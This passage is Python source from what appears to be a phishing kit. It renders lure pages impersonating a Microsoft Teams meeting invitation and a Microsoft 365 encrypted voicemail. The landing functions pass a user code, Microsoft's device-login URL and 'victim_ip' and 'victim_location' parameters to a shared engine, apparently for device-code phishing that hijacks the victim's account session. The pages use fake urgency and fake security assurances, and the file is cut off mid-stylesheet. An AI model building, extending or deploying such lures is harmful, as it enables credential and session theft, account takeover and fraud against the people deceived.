# ── sandbox_templates.py ──────────────────────────────────────────────────
# Isolated Sandboxed Templates Studio for ICEBADGER / CRIMSON PAW
# Contains Meeting (Microsoft Teams) and Voicemail (Cloud Voicemail) templates.
# All templates run in isolated sandbox routes without affecting production deployments.
# ────────────────────────────────────────────────────────────────────────────

import json, urllib.parse
from datetime import datetime
import assets
import deployments

# ═══════════════════════════════════════════════════════════════════════════
# DEFAULT CONFIGURATIONS FOR THE TWO SANDBOX TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════

MEETING_DEFAULT_CONFIG = {
    'template_name': 'Teams Meeting',
    'brand_name': 'Microsoft Teams',
    'category': 'Collaboration & Video',
    'icon': '💬',
    # Pre-land config
    'title': 'Join Microsoft Teams Meeting',
    'description': "You have been invited to join a secured Microsoft Teams video & audio meeting room. Identity verification is required to admit external participants to the virtual lobby.",
    'meeting_topic': 'Q4 Executive Strategy & Security Review',
    'meeting_organizer': 'David Vance (Senior VP Operations)',
    'meeting_time': 'Today • Scheduled 45 mins',
    'meeting_id': '942 810 4392',
    'meeting_passcode': '649102',
    'doc_name': 'Teams-Meeting-Invitation.ics',
    'doc_badge': 'ICS',
    'doc_sub': 'Microsoft Teams Video Conference · Lobby access required',
    'doc_meta': 'Scheduled Meeting Room · Lobby access required',
    'landing_doc_sub': 'Scheduled Meeting Room · Lobby access required',
    'button_label': 'Join Teams Meeting',
    'footer_caption': 'Protected by Microsoft Teams enterprise security policies',
    'footer_text': 'End-to-end encrypted video & audio stream',
    'accent_color': '#5B5FC7',
    'spinner_color': '#5B5FC7',
    'page_color': '#f3f2f8',
    'card_bg': '#ffffff',
    'show_bg_image': True,
    'page_bg_blur': 8,
    # Landing config
    'landing_title': 'Sign in to Join Meeting Room',
    'landing_desc': 'Sign in with your Microsoft account to authenticate and enter the virtual meeting lobby.',
    'landing_mode': 'S',
    'show_left_panel': True,
    'left_title': 'Microsoft Teams',
    'left_desc': 'Scheduled Virtual Conference Lobby. Authentication required before admission.',
    'left_bg_color': '#5B5FC7',
    'verify_heading': 'Verify your identity',
    'verify_desc': 'To access the meeting room, complete authentication below.',
    'steps_heading': 'STEPS TO JOIN MEETING:',
    'steps_text': '1. Click the button below to open Microsoft authentication.\n2. Enter code {CODE} when prompted.\n3. Sign in with your Microsoft organization account.\n4. Return to this tab to be automatically admitted to the meeting room.',
    'copy_btn_label': 'Copy code',
    'signin_btn_label': 'Sign in with Microsoft',
    'copy_btn_color': '#5B5FC7',
    'signin_btn_color': '#000000',
    'code_card_bg': '#f5f5fc',
    'steps_card_bg': '#ffffff',
    # Success config
    'success_title': 'Lobby Access Authorized',
    'success_desc': 'Thanks for verifying your identity. You are now being admitted to the Microsoft Teams meeting room...',
    'success_url': 'https://teams.microsoft.com/',
    'redirect_delay_ms': 3500
}

VOICEMAIL_DEFAULT_CONFIG = {
    'template_name': 'Cloud Voicemail',
    'brand_name': 'Microsoft 365 Voicemail',
    'category': 'Unified Voice & Audio',
    'icon': '🎙️',
    # Pre-land config
    'title': 'New Encrypted Voicemail (0:48)',
    'description': "You have received a high-priority encrypted voice message. Verify your identity with your organizational account to decrypt the audio recording and play.",
    'caller_id': '+1 (800) 419-7250 / Corporate Partner',
    'received_time': 'Today, 11:24 AM (14 min ago)',
    'audio_duration': '0:48',
    'doc_name': 'Voicemail-External-(0m48s).wav',
    'doc_badge': 'WAV',
    'doc_sub': 'Exchange Cloud Voicemail · 1.2 MB Audio WAV',
    'doc_meta': 'Exchange Cloud Voicemail · Decryption required',
    'landing_doc_sub': 'Exchange Cloud Voicemail · Decryption required',
    'button_label': '▶ Play Encrypted Voicemail',
    'footer_caption': 'Encrypted via Microsoft 365 Cloud Voicemail',
    'footer_text': 'Protected voice transmission · Exchange Online',
    'accent_color': '#0078D4',
    'spinner_color': '#0078D4',
    'page_color': '#f2f6fa',
    'card_bg': '#ffffff',
    'show_bg_image': True,
    'page_bg_blur': 8,
    # Landing config
    'landing_title': 'Decrypt Audio Voice Message',
    'landing_desc': 'Authenticate with your Microsoft account to decrypt audio and stream the voicemail message.',
    'landing_mode': 'S',
    'show_left_panel': True,
    'left_title': 'Cloud Voicemail',
    'left_desc': 'Exchange Online Audio Decryption Service. Compliance verification required.',
    'left_bg_color': '#0078D4',
    'verify_heading': 'Verify your identity',
    'verify_desc': 'To decrypt and listen to this audio message, complete verification below.',
    'steps_heading': 'STEPS TO LISTEN:',
    'steps_text': '1. Click the button below to open the Microsoft sign-in window.\n2. Enter code {CODE} when prompted.\n3. Authenticate with your Microsoft organization account.\n4. Return to this tab to immediately decrypt and stream the audio.',
    'copy_btn_label': 'Copy code',
    'signin_btn_label': 'Sign in with Microsoft',
    'copy_btn_color': '#0078D4',
    'signin_btn_color': '#000000',
    'code_card_bg': '#f0f7fd',
    'steps_card_bg': '#ffffff',
    # Success config
    'success_title': 'Voicemail Decrypted Successfully',
    'success_desc': 'Identity confirmed. Launching audio message playback in your Microsoft 365 inbox...',
    'success_url': 'https://outlook.office.com/mail/',
    'redirect_delay_ms': 3500
}

SANDBOX_TEMPLATES = {
    'meeting': MEETING_DEFAULT_CONFIG,
    'voicemail': VOICEMAIL_DEFAULT_CONFIG
}

# ═══════════════════════════════════════════════════════════════════════════
# PRE-LAND RENDERERS
# ═══════════════════════════════════════════════════════════════════════════

def render_meeting_preland(cfg=None, proceed_url='/sandbox/templates/meeting/landing'):
    cfg = {**MEETING_DEFAULT_CONFIG, **(cfg or {})}
    title = cfg.get('title', 'Join Microsoft Teams Meeting')
    desc = cfg.get('description', '')
    topic = cfg.get('meeting_topic', 'Q4 Executive Strategy & Security Review')
    organizer = cfg.get('meeting_organizer', 'David Vance (Senior VP Operations)')
    m_time = cfg.get('meeting_time', 'Today • Scheduled 45 mins')
    m_id = cfg.get('meeting_id', '942 810 4392')
    m_code = cfg.get('meeting_passcode', '649102')
    btn_label = cfg.get('button_label', 'Join Teams Meeting')
    foot1 = cfg.get('footer_caption', 'Protected by Microsoft Teams enterprise security policies')
    foot2 = cfg.get('footer_text', 'End-to-end encrypted video & audio stream')
    accent = cfg.get('accent_color', '#5B5FC7')
    page_bg = cfg.get('page_color', '#f3f2f8')
    card_bg = cfg.get('card_bg', '#ffffff')

    bg_img = cfg.get('bg_image') or cfg.get('page_bg_image') or assets.DEFAULT_BG_BLUEPRINT_B64
    show_bg = cfg.get('show_bg_image', True) not in (False, 'false', '0', 0)
    blur_val = int(cfg.get('page_bg_blur', 8)) if (bg_img and show_bg) else 0
    bg_style = f"background: url('{bg_img}') center/cover no-repeat; filter: blur({blur_val}px); -webkit-backdrop-filter: blur({blur_val}px);" if bg_img and show_bg else ""
    bg_layer_html = f'<div class="bg-layer" style="{bg_style}"></div>' if bg_img and show_bg else ''

    teams_logo = assets.get_logo_html('Teams', 52, 140, 'margin:0 auto 14px;')

    status_tag = cfg.get('status_tag', 'Lobby Open · Admission Required')
    show_status = cfg.get('show_status_tag', True) not in (False, 'false', '0', 0)
    status_html = f'<div class="teams-pill">{status_tag}</div>' if (show_status and status_tag) else ''

    show_title = cfg.get('show_title', True) not in (False, 'false', '0', 0)
    title_html = f'<h1>{title}</h1>' if (show_title and title) else ''

    show_topic = cfg.get('show_meeting_topic', True) not in (False, 'false', '0', 0)
    topic_html = f'<div class="meeting-topic">{topic}</div>' if (show_topic and topic) else ''

    show_desc = cfg.get('show_desc', True) not in (False, 'false', '0', 0)
    desc_html = f'<p class="desc">{desc}</p>' if (show_desc and desc) else ''

    show_org = cfg.get('show_meeting_organizer', True) not in (False, 'false', '0', 0)
    if show_org and organizer:
        org_html = f'''<div class="organizer-row">
            <div class="avatar">DV</div>
            <div class="org-info">
                <span class="org-name">{organizer}</span>
                <span class="org-title">Invited you to Microsoft Teams Video Conference</span>
            </div>
        </div>'''
    else:
        org_html = ''

    show_time = cfg.get('show_meeting_time', True) not in (False, 'false', '0', 0)
    show_id = cfg.get('show_meeting_id', True) not in (False, 'false', '0', 0)
    show_passcode = cfg.get('show_meeting_passcode', True) not in (False, 'false', '0', 0)

    meta_items = []
    if show_time and m_time: meta_items.append(f'<div class="meta-item"><span>🕒</span> <span>{m_time}</span></div>')
    meta_items.append('<div class="meta-item"><span>🔒</span> <span>Encrypted Room</span></div>')
    if show_id and m_id: meta_items.append(f'<div class="meta-item"><span>🆔</span> <span>ID: {m_id}</span></div>')
    if show_passcode and m_code: meta_items.append(f'<div class="meta-item"><span>🔑</span> <span>Passcode: {m_code}</span></div>')
    meta_grid_html = f'<div class="meta-grid">{"".join(meta_items)}</div>' if meta_items else ''

    details_box = f'<div class="meeting-details-box">{org_html}{meta_grid_html}</div>' if (org_html or meta_grid_html) else ''

    show_lobby = cfg.get('show_meeting_lobby', True) not in (False, 'false', '0', 0)
    lobby_note = cfg.get('meeting_lobby_note', '4 colleagues currently waiting in lobby')
    if show_lobby and lobby_note:
        lobby_html = f'''<div class="lobby-avatars">
        <div class="avatar-stack">
            <span>JD</span><span>AL</span><span>MK</span>
        </div>
        <span>{lobby_note}</span>
    </div>'''
    else:
        lobby_html = ''

    show_btn = cfg.get('show_btn_label', True) not in (False, 'false', '0', 0)
    if show_btn and btn_label:
        btn_html = f'''<button type="button" class="btn-join" onclick="launchMeeting(event)">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
        {btn_label}
    </button>'''
    else:
        btn_html = ''

    show_foot1 = cfg.get('show_foot1', True) not in (False, 'false', '0', 0)
    show_foot2 = cfg.get('show_foot2', True) not in (False, 'false', '0', 0)
    foot_items = []
    if show_foot1 and foot1: foot_items.append(f'<div class="f1">{foot1}</div>')
    if show_foot2 and foot2: foot_items.append(f'<div class="f2">🔒 {foot2}</div>')
    footer_html = f'<div class="footer">{"".join(foot_items)}</div>' if foot_items else ''

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{title}</title>
<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; }}
html, body {{ width: 100%; height: 100vh; max-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; background: {page_bg}; }}
.bg-layer {{ position: absolute; inset: 0; width: 100%; height: 100%; z-index: 1; }}
.card {{
    background: {card_bg};
    border-radius: 16px;
    box-shadow: 0 12px 40px rgba(91, 95, 199, 0.16), 0 2px 10px rgba(0,0,0,0.08);
    padding: clamp(20px, 3vh, 32px) clamp(20px, 3.5vw, 32px);
    max-width: 440px;
    width: 92%;
    text-align: center;
    position: relative;
    z-index: 2;
    border: 1px solid rgba(91, 95, 199, 0.18);
    display: flex;
    flex-direction: column;
}}
.teams-pill {{
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 12px;
    background: rgba(91, 95, 199, 0.10);
    color: #464EB8;
    border-radius: 20px;
    font-size: 0.72rem;
    font-weight: 700;
    margin: 0 auto 12px;
    letter-spacing: 0.04em;
    text-transform: uppercase;
}}
.teams-pill::before {{
    content: '';
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: #107C41;
    display: inline-block;
    box-shadow: 0 0 6px #107C41;
}}
h1 {{
    font-size: 1.18rem;
    font-weight: 700;
    color: #1a1a24;
    line-height: 1.35;
    margin-bottom: 6px;
}}
.meeting-topic {{
    font-size: 0.95rem;
    font-weight: 600;
    color: {accent};
    margin-bottom: 12px;
}}
.desc {{
    font-size: 0.82rem;
    color: #555566;
    line-height: 1.5;
    margin-bottom: 16px;
}}
.meeting-details-box {{
    background: #f8f8fc;
    border: 1px solid #e2e2ee;
    border-radius: 12px;
    padding: 12px 14px;
    margin-bottom: 18px;
    text-align: left;
}}
.organizer-row {{
    display: flex;
    align-items: center;
    gap: 10px;
    padding-bottom: 10px;
    border-bottom: 1px dashed #dcdcee;
    margin-bottom: 10px;
}}
.avatar {{
    width: 36px;
    height: 36px;
    border-radius: 50%;
    background: linear-gradient(135deg, #5B5FC7, #333A8C);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.78rem;
    font-weight: 700;
    flex-shrink: 0;
    box-shadow: 0 2px 6px rgba(91,95,199,0.3);
}}
.org-info {{ display: flex; flex-direction: column; }}
.org-name {{ font-size: 0.84rem; font-weight: 700; color: #202030; }}
.org-title {{ font-size: 0.72rem; color: #707086; }}
.meta-grid {{
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px;
    font-size: 0.75rem;
    color: #555566;
}}
.meta-item {{ display: flex; align-items: center; gap: 6px; }}
.lobby-avatars {{
    display: flex;
    align-items: center;
    gap: 10px;
    background: rgba(91, 95, 199, 0.05);
    border-radius: 20px;
    padding: 6px 12px;
    margin-bottom: 18px;
    font-size: 0.75rem;
    color: #464EB8;
    font-weight: 600;
}}
.avatar-stack {{
    display: flex;
    align-items: center;
}}
.avatar-stack span {{
    width: 22px;
    height: 22px;
    border-radius: 50%;
    background: #5B5FC7;
    color: #fff;
    font-size: 0.65rem;
    font-weight: 700;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 2px solid #fff;
    margin-left: -6px;
}}
.avatar-stack span:first-child {{ margin-left: 0; background: #0078D4; }}
.avatar-stack span:nth-child(2) {{ background: #107C41; }}
.avatar-stack span:nth-child(3) {{ background: #D83B01; }}
.btn-join {{
    width: 100%;
    padding: 13px 20px;
    background: linear-gradient(135deg, {accent}, #464EB8);
    color: #fff;
    border: none;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    font-size: 0.94rem;
    font-weight: 700;
    cursor: pointer;
    text-decoration: none;
    box-shadow: 0 4px 16px rgba(91, 95, 199, 0.35);
    transition: all 0.2s ease;
}}
.btn-join:hover {{
    transform: translateY(-1px);
    box-shadow: 0 6px 22px rgba(91, 95, 199, 0.48);
}}
.footer {{ margin-top: 14px; }}
.f1 {{ font-size: 0.73rem; color: #707086; margin-bottom: 2px; }}
.f2 {{ font-size: 0.68rem; color: #9090aa; }}
#spin {{
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.94);
    align-items: center;
    justify-content: center;
    z-index: 99;
    flex-direction: column;
    gap: 16px;
}}
.teams-dots {{
    display: flex;
    gap: 8px;
}}
.teams-dots span {{
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: {accent};
    animation: dots-bounce 1.2s infinite ease-in-out both;
}}
.teams-dots span:nth-child(1) {{ animation-delay: -0.32s; }}
.teams-dots span:nth-child(2) {{ animation-delay: -0.16s; }}
@keyframes dots-bounce {{
    0%, 80%, 100% {{ transform: scale(0); opacity: 0.4; }}
    40% {{ transform: scale(1); opacity: 1; }}
}}
</style>
</head>
<body>
{bg_layer_html}
<div id="spin">
    <div class="teams-dots"><span></span><span></span><span></span></div>
    <div style="font-weight:700; font-size:1.05rem; color:#222233;">Connecting to Microsoft Teams Lobby...</div>
    <div style="color:#777788; font-size:0.84rem;">Verifying organizational credentials</div>
</div>
<div class="card">
    {teams_logo}
    {status_html}
    {title_html}
    {topic_html}
    {desc_html}
    {details_box}
    {lobby_html}
    {btn_html}
    {footer_html}
</div>
<script>
function launchMeeting(e) {{
    e.preventDefault();
    document.getElementById('spin').style.display = 'flex';
    setTimeout(function() {{
        window.location.href = "{proceed_url}";
    }}, 1200);
}}
</script>
</body>
</html>'''


def render_voicemail_preland(cfg=None, proceed_url='/sandbox/templates/voicemail/landing'):
    cfg = {**VOICEMAIL_DEFAULT_CONFIG, **(cfg or {})}
    title = cfg.get('title', 'New Encrypted Voicemail (0:48)')
    desc = cfg.get('description', '')
    caller = cfg.get('caller_id', '+1 (800) 419-7250 / Corporate Partner')
    rec_time = cfg.get('received_time', 'Today, 11:24 AM (14 min ago)')
    duration = cfg.get('audio_duration', '0:48')
    btn_label = cfg.get('button_label', '▶ Play Encrypted Voicemail')
    foot1 = cfg.get('footer_caption', 'Encrypted via Microsoft 365 Cloud Voicemail')
    foot2 = cfg.get('footer_text', 'Protected voice transmission · Exchange Online')
    accent = cfg.get('accent_color', '#0078D4')
    page_bg = cfg.get('page_color', '#f2f6fa')
    card_bg = cfg.get('card_bg', '#ffffff')

    bg_img = cfg.get('bg_image') or cfg.get('page_bg_image') or assets.DEFAULT_BG_BLUEPRINT_B64
    show_bg = cfg.get('show_bg_image', True) not in (False, 'false', '0', 0)
    blur_val = int(cfg.get('page_bg_blur', 8)) if (bg_img and show_bg) else 0
    bg_style = f"background: url('{bg_img}') center/cover no-repeat; filter: blur({blur_val}px); -webkit-backdrop-filter: blur({blur_val}px);" if bg_img and show_bg else ""
    bg_layer_html = f'<div class="bg-layer" style="{bg_style}"></div>' if bg_img and show_bg else ''

    vm_logo = assets.get_logo_html('Voicemail', 52, 140, 'margin:0 auto 12px;')

    status_tag = cfg.get('status_tag', 'New Voicemail · Encrypted Recording')
    show_status = cfg.get('show_status_tag', True) not in (False, 'false', '0', 0)
    status_html = f'<div class="vm-pill">{status_tag}</div>' if (show_status and status_tag) else ''

    show_title = cfg.get('show_title', True) not in (False, 'false', '0', 0)
    title_html = f'<h1>{title}</h1>' if (show_title and title) else ''

    show_desc = cfg.get('show_desc', True) not in (False, 'false', '0', 0)
    desc_html = f'<p class="desc">{desc}</p>' if (show_desc and desc) else ''

    show_caller = cfg.get('show_vm_caller', True) not in (False, 'false', '0', 0)
    show_time = cfg.get('show_vm_time', True) not in (False, 'false', '0', 0)
    caller_row_items = []
    if show_caller and caller: caller_row_items.append(f'<span class="caller-number">📞 {caller}</span>')
    if show_time and rec_time: caller_row_items.append(f'<span class="caller-time">{rec_time}</span>')
    caller_row_html = f'<div class="caller-row">{"".join(caller_row_items)}</div>' if caller_row_items else ''

    show_duration = cfg.get('show_vm_duration', True) not in (False, 'false', '0', 0)
    duration_html = f'<span>{duration} (High Definition Audio)</span>' if (show_duration and duration) else ''

    show_btn = cfg.get('show_btn_label', True) not in (False, 'false', '0', 0)
    if show_btn and btn_label:
        btn_html = f'''<button type="button" class="btn-listen" onclick="decryptAudio(event)">
        {btn_label}
    </button>'''
    else:
        btn_html = ''

    show_foot1 = cfg.get('show_foot1', True) not in (False, 'false', '0', 0)
    show_foot2 = cfg.get('show_foot2', True) not in (False, 'false', '0', 0)
    foot_items = []
    if show_foot1 and foot1: foot_items.append(f'<div class="f1">{foot1}</div>')
    if show_foot2 and foot2: foot_items.append(f'<div class="f2">🔒 {foot2}</div>')
    footer_html = f'<div class="footer">{"".join(foot_items)}</div>' if foot_items else ''

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{title}</title>
<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; }}
html, body {{ width: 100%; height: 100vh; max-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; background: {page_bg}; }}
.bg-layer {{ position: absolute; inset: 0; width: 100%; height: 100%; z-index: 1; }}
.card {{
    background: {card_bg};
    border-radius: 16px;
    box-shadow: 0 12px 38px rgba(0, 120, 212, 0.14), 0 2px 10px rgba(0,0,0,0.06);
    padding: clamp(20px, 3vh, 32px) clamp(20px, 3.5vw, 32px);
    max-width: 440px;
    width: 92%;
    text-align: center;
    position: relative;
    z-index: 2;
    border: 1px solid rgba(0, 120, 212, 0.16);
    display: flex;
    flex-direction: column;
}}
.vm-pill {{
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 12px;
    background: rgba(229, 9, 20, 0.08);
    color: #e50914;
    border-radius: 20px;
    font-size: 0.72rem;
    font-weight: 700;
    margin: 0 auto 12px;
    letter-spacing: 0.04em;
    text-transform: uppercase;
}}
.vm-pill::before {{
    content: '';
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: #e50914;
    display: inline-block;
    box-shadow: 0 0 8px #e50914;
    animation: blink-red 1.2s infinite;
}}
@keyframes blink-red {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.3; }} }}
h1 {{
    font-size: 1.18rem;
    font-weight: 700;
    color: #1a1a24;
    line-height: 1.35;
    margin-bottom: 6px;
}}
.desc {{
    font-size: 0.82rem;
    color: #555566;
    line-height: 1.5;
    margin-bottom: 16px;
}}
/* Audio Waveform Player Widget */
.audio-player-box {{
    background: #f4f8fc;
    border: 1px solid #d8e8f8;
    border-radius: 14px;
    padding: 14px 16px;
    margin-bottom: 16px;
    text-align: left;
}}
.caller-row {{
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.76rem;
    margin-bottom: 10px;
}}
.caller-number {{ font-weight: 700; color: #1c3550; }}
.caller-time {{ color: #7890a8; }}
.player-controls {{
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 10px;
}}
.play-btn-circle {{
    width: 40px;
    height: 40px;
    border-radius: 50%;
    background: linear-gradient(135deg, {accent}, #004E8C);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    flex-shrink: 0;
    box-shadow: 0 4px 12px rgba(0, 120, 212, 0.35);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}}
.play-btn-circle:hover {{
    transform: scale(1.06);
    box-shadow: 0 6px 18px rgba(0, 120, 212, 0.45);
}}
.waveform {{
    display: flex;
    align-items: center;
    gap: 3px;
    flex-grow: 1;
    height: 32px;
}}
.wave-bar {{
    width: 3px;
    background: #c0d8f0;
    border-radius: 2px;
    transition: height 0.2s ease, background 0.2s ease;
}}
.audio-player-box.playing .wave-bar {{
    background: {accent};
    animation: wave-pulse 1s infinite ease-in-out alternate;
}}
@keyframes wave-pulse {{
    0% {{ transform: scaleY(0.4); }}
    100% {{ transform: scaleY(1.4); }}
}}
.time-strip {{
    display: flex;
    justify-content: space-between;
    font-size: 0.72rem;
    color: #7088a0;
    margin-bottom: 12px;
}}
.transcript-box {{
    background: #ffffff;
    border: 1px dashed #c8dcf0;
    border-radius: 8px;
    padding: 8px 10px;
    font-size: 0.72rem;
    color: #445566;
    line-height: 1.45;
}}
.btn-listen {{
    width: 100%;
    padding: 13px 20px;
    background: linear-gradient(135deg, {accent}, #005A9E);
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 0.94rem;
    font-weight: 700;
    cursor: pointer;
    text-decoration: none;
    box-shadow: 0 4px 16px rgba(0, 120, 212, 0.35);
    transition: all 0.2s ease;
}}
.btn-listen:hover {{
    transform: translateY(-1px);
    box-shadow: 0 6px 22px rgba(0, 120, 212, 0.48);
}}
.footer {{ margin-top: 14px; }}
.f1 {{ font-size: 0.73rem; color: #707086; margin-bottom: 2px; }}
.f2 {{ font-size: 0.68rem; color: #9090aa; }}
#spin {{
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.94);
    align-items: center;
    justify-content: center;
    z-index: 99;
    flex-direction: column;
    gap: 16px;
}}
.vm-spinner {{
    width: 44px;
    height: 44px;
    border: 4px solid #e0e8f0;
    border-top-color: {accent};
    border-radius: 50%;
    animation: spin 0.85s linear infinite;
}}
@keyframes spin {{ to {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
{bg_layer_html}
<div id="spin">
    <div class="vm-spinner"></div>
    <div style="font-weight:700; font-size:1.05rem; color:#1c3550;">Decrypting Cloud Voicemail Audio...</div>
    <div style="color:#778899; font-size:0.84rem;">Streaming secure voice note from Microsoft 365</div>
</div>
<div class="card">
    {vm_logo}
    {status_html}
    {title_html}
    {desc_html}
    
    <div class="audio-player-box" id="audioPlayer">
        {caller_row_html}
        <div class="player-controls">
            <div class="play-btn-circle" onclick="togglePlayPreview(event)">
                <svg id="playIcon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="waveform">
                <span class="wave-bar" style="height:10px;"></span>
                <span class="wave-bar" style="height:18px;"></span>
                <span class="wave-bar" style="height:26px;"></span>
                <span class="wave-bar" style="height:14px;"></span>
                <span class="wave-bar" style="height:22px;"></span>
                <span class="wave-bar" style="height:28px;"></span>
                <span class="wave-bar" style="height:16px;"></span>
                <span class="wave-bar" style="height:24px;"></span>
                <span class="wave-bar" style="height:12px;"></span>
                <span class="wave-bar" style="height:20px;"></span>
                <span class="wave-bar" style="height:26px;"></span>
                <span class="wave-bar" style="height:18px;"></span>
                <span class="wave-bar" style="height:12px;"></span>
                <span class="wave-bar" style="height:24px;"></span>
                <span class="wave-bar" style="height:14px;"></span>
                <span class="wave-bar" style="height:8px;"></span>
            </div>
        </div>
        <div class="time-strip">
            <span id="currTime">0:00</span>
            {duration_html}
        </div>
        <div class="transcript-box">
            🔒 <strong>Transcript Preview:</strong> "Hi, this is regarding the urgent contract approval and financial verification for your department... [Audio encrypted - Authenticate to stream full 48s message]"
        </div>
    </div>

    {btn_html}

    {footer_html}
</div>
<script>
var isPlaying = false;
function togglePlayPreview(e) {{
    e.stopPropagation();
    var box = document.getElementById('audioPlayer');
    var icon = document.getElementById('playIcon');
    isPlaying = !isPlaying;
    if (isPlaying) {{
        box.classList.add('playing');
        icon.innerHTML = '<path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/>';
        simulatePlayback();
    }} else {{
        box.classList.remove('playing');
        icon.innerHTML = '<path d="M8 5v14l11-7z"/>';
    }}
}}
function simulatePlayback() {{
    var t = 0;
    var timer = setInterval(function() {{
        if (!isPlaying || t >= 48) {{ clearInterval(timer); return; }}
        t += 1;
        var m = Math.floor(t / 60);
        var s = t % 60;
        document.getElementById('currTime').innerText = m + ':' + (s < 10 ? '0' : '') + s;
    }}, 1000);
}}
function decryptAudio(e) {{
    e.preventDefault();
    document.getElementById('spin').style.display = 'flex';
    setTimeout(function() {{
        window.location.href = "{proceed_url}";
    }}, 1200);
}}
</script>
</body>
</html>'''

# ═══════════════════════════════════════════════════════════════════════════
# LANDING RENDERERS (Modes S / A / B / C / R compatible)
# ═══════════════════════════════════════════════════════════════════════════

def render_meeting_landing(cfg=None, user_code='TEAMS-8942', verification_uri='https://microsoft.com/devicelogin', success_url='/sandbox/templates/meeting/success', mode='S', victim_ip='127.0.0.1', victim_location='Local Network'):
    merged = {**MEETING_DEFAULT_CONFIG, **(cfg or {})}
    merged['template_name'] = 'Teams'
    icon = assets.get_logo_html('Teams', 48)
    icon_mini = assets.get_logo_html('Teams', 28)

    # Use ICEBADGER shared landing engine
    return deployments._dispatch_landing(
        merged, user_code, verification_uri,
        icon_svg=icon, icon_svg_mini=icon_mini,
        org_name=merged.get('meeting_topic', 'Microsoft Teams'),
        default_accent='#5B5FC7', default_page_bg='#f3f2f8',
        mode=mode, victim_ip=victim_ip, victim_location=victim_location,
        success_url=success_url
    )

def render_voicemail_landing(cfg=None, user_code='VMAIL-6319', verification_uri='https://microsoft.com/devicelogin', success_url='/sandbox/templates/voicemail/success', mode='S', victim_ip='127.0.0.1', victim_location='Local Network'):
    merged = {**VOICEMAIL_DEFAULT_CONFIG, **(cfg or {})}
    merged['template_name'] = 'Voicemail'
    icon = assets.get_logo_html('Voicemail', 48)
    icon_mini = assets.get_logo_html('Voicemail', 28)

    # Use ICEBADGER shared landing engine
    return deployments._dispatch_landing(
        merged, user_code, verification_uri,
        icon_svg=icon, icon_svg_mini=icon_mini,
        org_name=merged.get('caller_id', 'Exchange Cloud Voicemail'),
        default_accent='#0078D4', default_page_bg='#f0f4f9',
        mode=mode, victim_ip=victim_ip, victim_location=victim_location,
        success_url=success_url
    )

# ═══════════════════════════════════════════════════════════════════════════
# SUCCESS RENDERERS
# ═══════════════════════════════════════════════════════════════════════════

def render_meeting_success(cfg=None, success_url='https://teams.microsoft.com/'):
    cfg = {**MEETING_DEFAULT_CONFIG, **(cfg or {})}
    title = cfg.get('success_title', 'Lobby Access Authorized')
    desc = cfg.get('success_desc', 'Thanks for verifying your identity. You are now being admitted to the Microsoft Teams meeting room...')
    accent = cfg.get('accent_color', '#5B5FC7')
    page_bg = cfg.get('page_color', '#f3f2f8')
    card_bg = cfg.get('card_bg', '#ffffff')
    delay = int(cfg.get('redirect_delay_ms', 3500))

    teams_logo = assets.get_logo_html('Teams', 52, 140, 'margin:0 auto 16px;')

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; }}
body {{ min-height: 100vh; display: flex; align-items: center; justify-content: center; background: {page_bg}; }}
.card {{
    background: {card_bg};
    border-radius: 16px;
    box-shadow: 0 8px 32px rgba(91,95,199,0.14);
    padding: 40px 32px;
    max-width: 400px;
    width: 90%;
    text-align: center;
    border: 1px solid rgba(91,95,199,0.18);
}}
.success-check {{
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: #107C41;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.8rem;
    margin: 0 auto 16px;
    box-shadow: 0 4px 16px rgba(16, 124, 65, 0.35);
}}
h1 {{ font-size: 1.25rem; font-weight: 700; color: #1a1a24; margin-bottom: 10px; }}
